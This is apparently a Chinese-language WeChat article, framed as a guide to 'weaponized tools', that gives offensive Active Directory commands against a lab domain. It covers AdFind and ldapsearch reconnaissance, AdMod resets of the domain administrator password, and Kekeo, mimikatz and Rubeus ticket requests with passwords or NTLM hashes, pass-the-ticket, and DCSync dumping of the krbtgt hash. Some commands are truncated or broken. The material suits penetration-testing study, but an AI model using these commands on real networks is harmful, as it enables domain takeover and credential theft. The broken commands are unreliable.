<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/lk73Mr5MX7j9yWH2esqhsQ)

武器化工具
=====

需要 md 文档或 pdf 文档的可以后台留言 文档 获得~

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nq6qBrgJoreMxqKS8EXZPXKC7kB1AyvqysXEKBao6umHEdTicRO0FbP5w/640?wx_fmt=png&from=appmsg)

Adfind 的使用
==========

Adfind 是 C++ 编写的活动目录查询工具

### 参数

1.  1. 连接参数
    

连接参数是在连接的时候指定的参数。如果在域内机器上执行 Adfind，则不需要连接参数。如果是域外机器上执行 Adfind，则需要指定连接参数。

*   • h 指定主机与端口（ip:port）
    
*   • p 也可以单独指定端口
    
*   • u 指定用户
    
*   • up 指定密码
    

1.  1. 过滤参数
    

过滤参数用于指定查询的时候需要过滤的一些条件

*   • b 指定要查询的根节点 basedn
    
*   • bit 指定位查询
    
*   • f LDAP 过滤条件 指定 LDAP 语法
    

1.  1. 显示参数
    

显示参数是设置查询出来后如何显示的参数

*   • appver 显示 Adfind 版本信息
    
*   • c 只统计数量
    
*   • csv 导出为 csv 格式
    
*   • dn 只显示 DN 不返回详细信息
    
*   • s 搜索范围，包括 one（当前层级）和 sub（一层一层递归），默认是 sub
    
*   • recmute 如果所有属性都为空，则禁止显示 DN，主要适用于 - sddl 过滤器选项
    
*   • t 查询超时时间，默认为 120s
    

1.  1. 帮助参数
    

帮助参数用于提供帮助信息

*   • help 基础帮助
    
*   • ?? 高级帮助
    
*   • ???? 快捷方式帮助
    
*   • sc? 快捷方式帮助
    
*   • meta? 元数据帮助
    
*   • regex? 固定表达式帮助
    

### 使用

Adfind 工具使用的结构如下

Adfind.exe [switches] [-b basedn] [-f filter] [attr list]

1.  1. switches
    

连接参数，如果在域内机器上执行 Adfind，则不需要该选项。如果是域外机器上执行 Adfind，则需要指定域控并提供一个有效的域用户和密码。

1.  1. basedn
    

指定要查询的根节点 basedn

```
# 查询DN为dc=god,dc=org下的所有机器
AdFind.exe -b dc=god,dc=org -f "objectcategory=computer" dn

# 查询DN为CN=Computers,dc=god,dc=org下的所有机器
AdFind.exe -b CN=Computers,dc=god,dc=org -f "objectcategory=computer" dn

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqlibePc0S8GISbTFiaPwpwX0aibYibGKzMgZUqCnLDStEwn42f5icwVvXRpA/640?wx_fmt=png&from=appmsg)  

1.  1. f filter
    

该选项指定查询的过滤条件，使用 - f 参数过滤不同的查询条件

```
# 查询域内所有机器
AdFind.exe -f "objectcategory=computer" dn

# 查询域内所有用户
AdFind.exe -f "&((objectcategory=person)(objectClass=user))" dn

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nq5r7xViby8Kgq6rB2D0vCXJS6y8fiaaDopXibZPHDSTzv0R6XVqNBvSYfQ/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqAJsia2p76Df7cMza5MLTWvheX5RvQls1yUoGflIAeZ91sibnic0mMnlCA/640?wx_fmt=png&from=appmsg)

1.  1. attr list
    

该选项指定查询出来的结果显示哪个属性。当不使用该参数时，会显示查询对象的所有属性

```
# 查询域内所有机器，显示所有机器的所有属性
AdFind.exe -f "objectcategory=computer"

# 查询域内所有机器，显示所有机器的DN属性
AdFind.exe -f "objectcategory=computer" dn

# 查询域内所有机器，显示所有机器的DN属性，查询结果不换行。只有DN属性能在前面加“-”符号
AdFind.exe -f "objectcategory=computer" -dn

# 查询域内所有机器，显示所有机器的name属性
AdFind.exe -f "objectcategory=computer" name

```

查询示例
----

实战中常用到的一些查询语法

### 1. 查询域信任关系

```
AdFind.exe -f objectclass=trusteddomain -dn

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqUtDObf6D1icOtRH09kwfAIPbXSKXAWvp8plbiaKbnGYAhhFjpA9fZuaw/640?wx_fmt=png&from=appmsg)

### 2. 查询域控

```
# 查询域控名称
AdFind.exe -sc dclist

# 查询域控版本
AdFind.exe -schema -s base objectversion

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqIlNN5Lz29ice55WqicUXszibLdHbUA8pVOW7E4xsllaKLO82wTkicbvAJA/640?wx_fmt=png&from=appmsg)

### 3. 机器相关的查询命令

```
# 查询域中所有机器，只显示DN
AdFind.exe -f "objectcategory=computer" dn

# 查询域中所有机器，显示机器名和操作系统
AdFind.exe -f "objectcategory=computer" name operatingSystem

# 查询域中活跃机器，只显示DN名
AdFind.exe -sc computers_active dn

# 查询域中活跃机器，显示机器名和操作系统
AdFind.exe -sc computers_active name operatingSystem

# 查询指定机器的详细信息
AdFind.exe -f "&(objectcategory=computer)(

# 查询被域用户创建的机器账户列表
AdFind.exe -b "DC=xuan,DC=com" -f "objectClass=computer" mS-DS-CreatorSID


```

### 4. 用户相关的查询命令

```
# 查询域管理员
AdFind.exe -b "CN=Domain Admins,CN=Users,DC=god,DC=org" member

# 查询域内所有用户
AdFind.exe -b dc=god,dc=org -f "(&(objectcategory=person)(objectClass=user))" -dn

# 查询域内指定用户的信息
AdFind.exe -sc u:xuan

# 查询域内指定用户的sid值
AdFind.exe -sc adsid:S-1-5-21-2952760202-1353902439-2381784089-1111

# 查询域内指定用户属于哪些组
AdFind.exe -s subtree -b CN=administrator,CN=users,DC=god,DC=org memberOf

# 递归查询指定用户属于哪些组
AdFind.exe -s subtree -f "(member:INCHAIN:="CN=administrator,CN=users,DC=god,DC=org")" -bit -dn

# 查询域内开启了不需要域认证选项的用户
AdFind.exe -f "useraccountcontrol:1.2.840.113556.1.4.803:=4194304" -dn

# 查询受保护的用户
AdFind.exe -f "&(objectcatory=person)(samaccount -dn

# 查询users容器下所有对象
AdFind.exe -users -dn

```

### 5. 组相关的查询命令

```
# 查询域内所有的全局组
AdFind.exe -f "(grouptype=-2147483646)" -dn

# 查询域内所有的通用组
AdFind.exe -f "(grouptype=-2147483640)" -dn

# 查询域内所有的本地域组
AdFind.exe -f "(|(grouptype=-2147483644)(grouptype=-2147483643))" -dn

# 查询指定组含有哪些对象
AdFind.exe -s subtree -b "CN=Domain Admins,CN=Users,DC=god,DC=org" member

# 递归查询指定组含有哪些域用户
AdFind.exe -s subtree -b dc=god,dc=org -f "(memberof:INCHAIN:="CN="Domain Admins",CN=Users,DC=god,DC=org")" -bit -dn

```

### 6. 委派相关的查询命令

```
# 查询域中配置非约束性委派的主机
AdFind.exe -b "DC=god,DC=org" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn

# 查询域中配置非约束性委派的服务账户
AdFind.exe -b "DC=god,DC=org" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" dn

# 查询域中配置了约束性委派的主机，并可以看到被委派的SPN
AdFind.exe -b "DC=god,DC=org" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto

# 查询域中配置了约束性委派的服务账户，并可以看到被委派的SPN
AdFind.exe -b "DC=god,DC=org" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto

#查询域中配置了基于资源的约束性委派的主机
AdFind.exe -b "DC=god,DC=org" -f "(&(samAccountType=805306369)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" msDS-AllowedToActOnBehalfOfOtherIdentity

# 查询域中配置了基于资源的约束性委派的服务账户
AdFind.exe -b "DC=xuan,DC=com" -f "(&(samAccountType=805306368)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" msDS-AllowedToActOnBehalfOfOtherIdentity

# 查询域中所有机器，显示DN和CN
AdFind.exe -b "DC=xuan,DC=com" -f "objectClass=computer" mS-DS-CreatorSID

# 根据查询出来的sid找出对应的用户名
AdFind.exe -b "DC=xuan,DC=com" -f "(&(objectsid=S-1-5-21-1477789205-324620140-3651044789-1108))" objectclass cn dn

# 使用adfind.exe查找机器账户的mS-DS-CreatorSID属性
AdFind.exe -b "DC=xuan,DC=com" -f "objectClass=computer" mS-DS-CreatorSID

# 使用Powershell反查SID对应的用户
powerpick $objSID = New-Object System.Security.Principal.SecurityIdentifier S-1-5-21-3309395417-4108617856-2168433834-1104;$objUser = $objSID.Translate([System.Security.Principal.NTAccount]);$objUser.Value

```

### 7. 其他

```
# 查询域内具有复制目录权限的用户
AdFind.exe -s subtree -b "DC=god,DC=org" nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"Replicating Directory Changes";; -recmute -resolvesids

# 查询域内具有复制目录所有项权限的用户
AdFind.exe -s subtree -b "DC=god,DC=org" nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"Replicating Directory Changes All";; -recmute -resolvesids

# 查询域中的OU
AdFind.exe -f "objectClass=organizationalUnit" dn

# 查询域的ACL
AdFind.exe -b DC=gor,DC=org -sc getacl

# 查询rightsGuid对应的扩展权限
AdFind.exe -b CN=Extended-Rights,CN=Configuration,DC=god,DC=org -f "rightsGuid=1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" dn

# 查询域内所有GPO
AdFind.exe -sc gpodmp

# 查询域内高权限的SPN
AdFind.exe -b "DC=gor,DC=org" -f "&(servicePrincipal servicePrincipalName

# 查询域内的所有邮箱并以csv格式显示
AdFind.exe -f "mail=*" mail -s Subtree -recmute -csv moblie

# 查询域内的所有手机号并以csv的格式显示
AdFind.exe -f "telephonenumber=*" telephonenumber -s Subtree -recmute -csv moblie

```

Admod
=====

Admod 是一个使用 C++ 编写的活动目录修改器，允许有权限的用户轻松的修改各种活动目录信息

### 参数

1.  1. 连接参数
    

连接参数是在连接的时候指定的参数

*   • h 指定主机和端口
    
*   • p 也可以单独使用 - p 参数指定端口
    
*   • u 指定用户
    
*   • up 指定密码
    

1.  1. 过滤参数
    

*   • b 指定要修改的根节点 basedn
    

1.  1. 修改参数
    

修改参数是修改是用到的一些参数，比如添加、删除、重命名等

*   • rm 删除指定的对象
    
*   • del -rm 的别名
    
*   • add 添加对象
    
*   • undel x 取消删除指定的对象。需使用未知的父对象，除非 x 中提供了一个父节点
    
*   • rename x 将对象重复名为 x 的 RDN
    
*   • move x 将对象移动到由 x 指定的父对象
    

### 使用

Admod 使用结构如下：

Admod [switches] [-b basedn] [attr-action]

1.  1. switches
    

该选项是连接参数，在执行一些高权限操作的时候。需要指定高权限的用户名和密码

```
Admod -h 192.168.52.138 -u god.org\Administrator -up dc123.com -b dc=god,dc=org "description::test"

```

1.  1. attr-action
    

该选项使用户指定要进行的操作，如 add 添加 rm 删除等。使用 rm 删除用户 testuser 的命令如下

```
Admod.exe -b cn=testuser,cn=users,dc=god,dc=org -rm

```

修改示例
----

### 1. 创建用户

创建 testuser 用户，创建完成后该用户仍处于禁用状态。

```
AdMod.exe -b cn=testuser,cn=users,dc=god,dc=org -add objectclass::user samaccountname::testuser

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqbFibxhvc28eE9ogTzGatGd9GL0A06jQ3vDnfbzLD83BfC8mCyS8vQjg/640?wx_fmt=png&from=appmsg)

### 2. 创建 OU

创建技术部 OU 的命令 如果包含中文，先将当前页面编码改为 GBK

```
AdMod.exe -b OU=技术部,DC=god,DC=org -add objectclass::organizationalUnit

```

### 3. 将用户移动到指定 OU

```
AdMod.exe -b cn=testuser,cn=users,dc=god,dc=org -move OU=技术部,dc=god,dc=org

```

### 4. 删除用户

```
AdMod.exe -b cn=testuser,cn=users,dc=god,dc=org -rm

```

### 5. 重置用户密码

重置域管理员 administrator 的密码为 P@ss1234 的命令如下 该功能不需要知道用户的原始密码

```
AdMod.exe -users -rb cn=administrator unicodepwd::P@ss1234 -optenc

```

### 6. 修改用户密码

修改域管理员 administrator 的密码为 P@ss1234 的命令如下 该功能需要知道用户的原始密码 这里用户的原始密码为 dc123.com

```
AdMod.exe -users -rb cn=administrator unicodepwd::dc123.com unicodepwd::P@ss1234 -optenc

```

### 7. 修改域的 MAQ 为 0

修改域的 MAQ 值为 0 即不允许普通域用户创建机器账户

```
AdMod.exe -b "dc=god,dc=org" "ms-DS-MachineAccountQuota::0"

```

LDP
===

LDP 是微软自带的一款活动目录信息查询工具 普通域成员主机默认没有 LDP 工具 可以自行上传

### 连接域控

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqvCuk578XlZwfu9EskVJbgibrDEgLoPicIN1AujHSsj25RJOFKNo4RLnw/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqibjiasRDeHLicCRqMrXReXgdD9gAWjaHCSUL8sAJribtldJbibbrMXeq0uA/640?wx_fmt=png&from=appmsg)

### 绑定凭据

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqSaa8rQesXHZYmJbOto02OKInGuM1VYKLqe2ItxQfmgAsmLT2OOa1Kg/640?wx_fmt=png&from=appmsg)

### 查看

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqZ2Ssvhl85eUcwxoWSbKHhSj8yicGkPv0VByuc2Hj7WNGboo0kibXpVOQ/640?wx_fmt=png&from=appmsg)

Ldapsearch
==========

Ldapsearch 是类 UNIX 下一款用于活动目录信息查询的工具，kali 自带

### 参数

Ldapsearch -h

*   • H ldapuri 格式为 ldap:// 机器名或者 IP: 端口号 不能与 - h -p 同时使用
    
*   • h LDAP 服务器 IP 与 - p 可结合使用
    
*   • p LDAP 服务器端口号，与 - h 可结合使用
    
*   • x 使用简单认证方式
    
*   • D 认证的用户名
    
*   • w 密码 与 - W 二选一
    
*   • W 不输入密码，会交互式的提示用户输入密码，与 - w 二选一
    
*   • b 指定 basedn 进行查询
    
*   • f 从文件中读取操作
    
*   • c 出错之后忽略当前错误继续执行，默认情况下遇到错误即终止
    
*   • n 模拟操作但并不实际执行，用于验证，常与 - v 一同使用进行问题定位
    
*   • v 显示详细信息
    
*   • d 显示 debug 信息，可设定几倍
    
*   • o 输出为文件
    
*   • s 指定搜索范围，可选值有 base、one、sub、children
    

使用
--

### 1. 连接

```
# 使用账户xuan和密码-H参数连接域控的389端口
ldapsearch -H ldap://192.168.52.138:389 -D "xuan@god.org" -w 123.com

# 使用账户xuan和密码-h参数连接域控 -p指定端口
ldapsearch -h 192.168.52.138 -p 389 -D "xuan@god.org" -w 123.com

```

### 2. 过滤

```
# 查找指定basedn的信息
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "CN=administrator,CN=Users,DC=god,DC=org"

# 查找指定basedn的信息，并且过滤出name=administrator的条目
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "CN=administrator,CN=Users,DC=god,DC=org" "

```

### 3. 显示

默认情况下，查找的结果会显示对象的所有属性，如果只想显示指定属性，在末尾加上属性名即可，也可以使用 - o 参数将结果导出在文件中

```
#查找用户administrator用户的所有信息
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "CN=administrator,CN=Users,DC=god,DC=org"

# 查找用户administrator的DN属性
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "CN=administrator,CN=Users,DC=god,DC=org" dn

# 查找用户administrator的DN属性，使用grep过滤结果更直观
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "CN=administrator,CN=Users,DC=god,DC=org" | grep dn

# 查找用户administrator的所有信息，并将结果导出在指定LDIF格式文件中
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "CN=administrator,CN=Users,DC=god,DC=org" -o ldif-wrap=no > administrator.ldif

# 使用adoffline.py脚本将LDIF格式文件转换为sqlite格式文件
python2 adoffline.py ~/administrator.ldif

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqgd7A66KQdyjqNTp1Ob3sgX7PgZ207qicfxJGF3vA4pIDAySWde2mBGw/640?wx_fmt=png&from=appmsg)

查询示例
----

1.  1. 机器相关的查询命令
    

```
# 查询域中所有域控
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "OU=Domain Controllers,DC=god,DC=org" "objectcategory=computer" | grep dn

# 查询域中所有的机器（包括域控）
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "DC=god,DC=org" "objectcategory=computer" | grep dn
# 查询指定机器的详细信息
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "DC=god,DC=org" "(&(objectcategory=computer)(

```

1.  1. 用户相关的查询命令
    

```
# 查询域管理员组
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "CN=Domain Admins,
CN=Users,DC=god,DC=org" | grep member

# 查询域内所有用户
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "DC=god,DC=org" "(
&(objectcategory=person)(objectclass=user))" | grep dn

# 查询指定域用户xuan
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "DC=god,DC=org" "(&(objectcategory=person)(objectclass=user)(

# 查询指定域用户的sid
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "DC=god,DC=org" "(&(objectcategory=person)(objectclass=user)( | grep objectSid

# 查询指定sid对应的用户
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "DC=god,DC=org" "(&(objectcategory=person)(objectclass=user)(objectsid=AQUAAAAAAAUVAAAAiov/r2fpslAZJPeNVwQAAA==))"

# 查询指定域用户属于哪些组
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "DC=god,DC=org" "(&(objectcategory=person)(objectclass=user)( memberOf

# 查询域内开启不需要预认证的用户
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "DC=god,DC=org" "useraccountcontrol:1.2.840.113556.1.4.803:=4194304" | grep dn

# 查询域内受保护的ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "DC=god,DC=org" "(&(objectcategory=person)(samaccount | grep dn用户


```

1.  1. 组相关的查询命令
    

```
# 查询域内所有全局组
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "DC=god,DC=org" "groupType=-2147483646" | grep dn

# 查询域内所有通用组
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "DC=god,DC=org" "groupType=-2147483640" | grep dn

# 查询域内所有本地域组
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "DC=god,DC=org" "(|(grouptype=-2147483644)(grouptype=-2147483643))" | grep dn

# 查询指定组含有哪些对象
ldapsearch -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "CN=Domain Admins,CN=Users,DC=god,DC=org" member

```

1.  1. 委派相关的查询命令
    

```
# 查询域中配置了非约束性委派的主机
ldapsearch -x -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "DC=god,DC=org" "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" | grep dn

# 查询域中配置非约束性委派的服务账户
ldapsearch -x -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "DC=god,DC=org" "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" | grep dn

# 查询域中配置了约束性委派的主机，并可以看到被委派的SPN
ldapsearch -x -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "DC=god,DC=org" "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" | grep -e dn -e msDS-AllowedToDelegateTo

# 查询域中配置了约束性委派的服务账户，并可以看到被委派的SPN
ldapsearch -x -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "DC=god,DC=org" "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" | grep -e dn -e msDS-AllowedToDelegateTo

# 查询域中配置基于资源的约束性委派的主机
ldapsearch -x -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "DC=god,DC=org" "(&(samAccountType=805306369)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" | grep dn

# 查询域中配置基于资源的约束性委派的服务账户
ldapsearch -x -H ldap://192.168.52.138:389 -D "administrator@god.org" -w P@ss1234 -b "DC=god,DC=org" "(&(samAccountType=805306368)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" | grep dn

```

Kekeo
=====

使用 C 语言编写的针对 Kerberos 协议进行攻击的工具，可以发起 Kerberos 请求，并将请求的票据导入内存中，从而模拟 Kerberos 各个阶段攻击手段 了解即可

### kekeo 提供的模块

1.  1. standard 模块
    

命令解释如下：

*   • exit 退出
    
*   • cls 清屏
    
*   • answer 回答关于生命、宇宙、和一切的终极问题
    
*   • coffee 打印一个咖啡图形
    
*   • sleep 睡眠时间为 1ms
    
*   • log 打印日志到文件
    
*   • base64 用于 input/output 对于 base64 的支持
    
*   • version 显示版本
    
*   • cd 切换目录
    
*   • localtime 查看当前时间
    

这些 standard 命令几乎不常用 但是需要提一下 base64

```
# 查看base64的支持
base64

# input 支持base64
base64 /input:on

# output 支持base64
base64 /output:on

# input 不支持base64
base64 /input:off

# output 不支持base64
base64 /output:off

```

1.  1. 其他模块
    

*   • TGT 模块
    
*   • TGS 模块
    
*   • exploit 攻击模块
    
*   • misc 杂项模块
    
*   • Kerberos 包模块
    
*   • smb 小型模块
    
*   • NTLM 模块
    
*   • TSSSP 模块
    

最常用的是 TGT 和 TGS 模块

### 申请 TGT

使用 TGT 模块申请 TGT，可以使用明文或密码哈希进行认证。可以将票据导出成文件，或者直接导入到当前内存中

将 TGT 导入内存后，想请求什么服务，系统就会自动利用该 TGT 请求指定的服务 ST

1.  1. 明文密码请求
    

kekeo 支持使用明文密码请求 TGT，有 kekeo 自动导入票据和通过 mimikatz 手动导入票据两种方式

*   • kekeo 自动导入票据
    

使用 administrator 的明文密码请求 TGT 的命令如下，并自动导入到内存中；票据导入到内存中，就可以访问高权限服务了

```
# 明文密码申请TGT并导入到内存中
tgt::ask /user:administrator /domain:god.org /password:P@ss1234 /ptt

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqPr6HRMBWnLcH7puec6Q2oGicYuwqDfqPEH5VgTz9axF6KiblXDXT7K8A/640?wx_fmt=png&from=appmsg)

*   • 使用 mimkatz 手动导入票据
    

使用 administrator 的明文密码请求 TGT 的命令如下，并生成以 kirbi 结尾的票据，此时不导入内存中，接着使用 mimikatz 将该票据手动导入内存中。

```
# 明文密码申请TGT，此时会生成一个以kirbi结尾的票据
tgt::ask /user:administrator /domain:god.org /password:P@ss1234

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqaAjKeQvlgzdHhhh4r0GopribD4mgREswOdib1CjBzgdliaDvX9UClcNXA/640?wx_fmt=png&from=appmsg)

然后使用 mimikatz 将票据导入内存中，就可以使用该票据了

```
mimikatz.exe "kerberos::ptt TGT_administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi" "exit"

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqrcw5vbAkb1eeJgZhgoSZvQ9uxNtLz100aFM6f7iaOXtrz4XMLXmpTlw/640?wx_fmt=png&from=appmsg)

1.  1. 密码哈希请求
    

使用 administrator 的密码哈希请求 TGT 的命令如下

```
# 密码哈希申请TGT并导入内存中
tgt::ask /user:administrator /domain:god.org /ntlm:74520a4ec2626e3638066146a0d5ceae /ptt

# 密码哈希申请TGT，此时会产生一个kirbi结尾的票据 使用mimikatz导入即可使用
tgt::ask /user:administrator /domain:god.org /ntlm:74520a4ec2626e3638066146a0d5ceae


```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqiaqq87icGWV01vsdickmgUWQjp13Bw0bCRP6yLjJ8iavdJicQbfe4YdQO2w/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nquicCwovX7kagynvEPHBfLjvcokibria1cn9rL5vcdAHKh836xCZiaZ9YxQ/640?wx_fmt=png&from=appmsg)

### 申请 ST

kekeo 使用 tgs 模块申请 ST，需要提供一张 TGT。因此，要先使用 kekeo 申请一张 TGT，在使用 tgs 模块用 TGT 请求指定服务的 ST。可以将请求的 ST 导入内存中或者导出成票据文件

1.  1. 请求 TGT
    

生成一张 TGT

```
# 明文密码申请TGT，此时会生成一个以kirbi结尾的票据
tgt::ask /user:administrator /domain:god.org /password:P@ss1234

```

1.  1. 请求 ST
    

请求 St，平时请求的 CIFS 的票据指定用于 dir 操作而不能使用 mimikatz 的 DCSync 功能，要想使用的话，需要请求 LDAP 服务

*   • 请求 CIFS
    

用上一步得到的 TGT 请求 CIFS 的 ST , 导入后即可访问 CIFS 服务

```
tgs::ask /tgt:TGT_administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /sevice:cifs/owa.god.org

```

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqSq38SjrMlTnxujTRPDRk9piaHoIKU7OXWajtsZlvsDLLa9pJeIoBIQA/640?wx_fmt=png&from=appmsg)

*   • 请求 LDAP 服务
    

利用上一步得到的 TGT 请求 LDAP 服务的 ST

```
# 请求访问owa.god.org 的LDAP服务的ST并导入内存中
tgs::ask /tgt:TGT_administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /sevice:ldap/owa.god.org /ptt

# 通过mimikatz的DCSync功能导出域用户的Hash
mimikatz.exe "lsadump::dcsync /domain:god.org /user:krbtgt/csv" "exit"

```

没导入 ST 之前无法导出 krbtgt 用户哈希

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqfrDAj9icwavSySuu0hndmHsSsppc9UxOOdNUlibk61icrccEn5Xe0BsxQ/640?wx_fmt=png&from=appmsg)

导入 ST 后就可以了

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqRATthnbTKWdhbmbqTdnAtB2g8nBIUdw9MvpcT0yflaaVBHVHQoLZsQ/640?wx_fmt=png&from=appmsg)

Rubeus
======

Rubeus 可以发起 Kerberos 请求, 并将请求票据导入内存中, Rebeus 提供了大量的用于 Kerberos 攻击的功能, 比如 TGT 请求 \ ST 请求 \ AS-REP Roasting 攻击 \ Kerberoasting 攻击 \ 委派攻击 \ 黄金票据 \ 白银票据等。

### 申请 TGT

Rubeus 使用 asktgt 模块请求 TGT，可以使用明文、密码哈希（DES 加密和 RC4 加密）和 AES Key（AES128 和 AES256) 进行认证, 可以将 TGT 以 base64 打印出来。也可以将 TGT 保存为文件，还可以将 TGT 导入内存中

asktgt 模块有以下参数 中括号内的为可选参数

*   • user:USER 请求的用户名
    
*   • </password:PASSWORD [/enctype:DES|RC4|AEX128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH>
    
*   • [/domain:DOMAIN] 域名
    
*   • [/dc:DOMAIN_CONTROLLER] 域控
    
*   • [outfile:FILENAME] 输出的文件
    
*   • [/ptt] 将票据导入内存中
    
*   • [/luid] 将生成的票据用于指定的登录会话（需要管理员权限）
    
*   • [/mowrap] 打印出的 base64 格式票据的显示格式更友好
    
*   • [/nopac] 票据中不请求 PAC
    

如果没有指定 / domain 参数，则默认使用主机当前所在的域，如果没有指定 / dc 参数 则使用 DsGetDcName 函数来获取主机当前所在域的域控

1.  1. 明文密码请求
    

Rubeus 支持使用明文密码请求 TGT，使用 administrator 的明文密码请求 TGT，命令如下：

```
# 明文密码申请TGT，以base64格式打印出来并导入内存中
Rubeus.exe asktgt /user:administrator /password:P@ss1234 /nowrap /ptt

# 明文密码申请TGT，将票据保存为ticket.kirbi文件，并导入内存中
Rubeus.exe asktgt /user:administrator /password:P@ss1234 /nowrap /ptt /outfile:ticket.kirbi

```

TGT 导入内存后，就可以访问高权限服务了

![](https://mmbiz.qpic.cn/mmbiz_png/Oum0kexPoVoXvicONBUiaBibxicsD1ych4nqhlJAEIkW3ZtJce6EUdHUxJSr3qEYkn2ttr0e6gkPQsnm4g304639uA/640?wx_fmt=png&from=appmsg)

1.  1. 密码 Hash 请求
    

Rubeus 也支持使用密码 hash 请求 TGT。使用 administrator 的密码哈希请求 TGT，命令如下

```
# 密码哈希申请TGT，以base64格式打印出来并导入内存中
Rubeus.exe asktgt /user:administrator /rc4:74520a4ec2626e3638066146a0d5ceae /enctype:RC4 /nowrap /ptt

# 密码哈希申请TGT，将票据保存为ticket.kirbi文件，并导入内存中
Rubeus.exe asktgt /user:administrator /rc4:74520a4ec2626e3638066146a0d5ceae /enctype:RC4 /nowrap /ptt /outfile:ticket.kirbi

```

TGT 导入内存后，即可以访问高权限服务

